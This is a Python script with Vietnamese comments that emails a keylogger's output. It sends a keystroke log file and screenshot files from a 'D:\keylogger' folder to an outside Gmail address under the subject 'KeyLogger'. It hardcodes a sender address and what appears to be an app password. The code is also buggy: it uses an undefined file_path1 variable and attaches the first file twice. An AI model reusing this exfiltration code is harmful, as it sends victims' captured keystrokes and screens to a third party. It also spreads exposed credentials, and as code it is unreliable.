import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
datetime.now()
def send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, file_path):
    # Tạo đối tượng MIMEMultipart cho email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Thêm nội dung văn bản vào email
    msg.attach(MIMEText(body, 'plain'))

    # Mở tệp và thêm vào email dưới dạng file đính kèm
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {file_path}')

        # Đính kèm file vào email
        msg.attach(part)
    with open(file_path1, 'rb') as attachment:
        part1 = MIMEBase('application', 'octet-stream')
        part1.set_payload(attachment.read())
        encoders.encode_base64(part1)
        part1.add_header('Content-Disposition', f'attachment; filename= {file_path1}')

        # Đính kèm file vào email
        msg.attach(part)
    try:
        # Kết nối tới máy chủ SMTP và đăng nhập
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Bật TLS
        server.login(sender_email, sender_password)
        
        # Gửi email
        server.send_message(msg)
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        # Đóng kết nối
        server.quit()

# Thông tin cần thiết để gửi email

sender_email = "nguyenhoangphuc18022006@gmail.com"         # Địa chỉ email của bạn
sender_password = "uckl osfl fvgj edql"             # Mật khẩu của bạn
receiver_email = "th6657051@gmail.com"   # Địa chỉ email người nhận
subject = "KeyLogger"              # Tiêu đề email
body = "DATA in here"       # Nội dung email
file_path = "D:\\keylogger\\keylogger.txt"           # Đường dẫn đến file đính kèm
file_path1= "D:\keylogger\screenshot\screenshot_%Y%m%d_%H%M%S.png"

# Gửi email
send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, file_path)
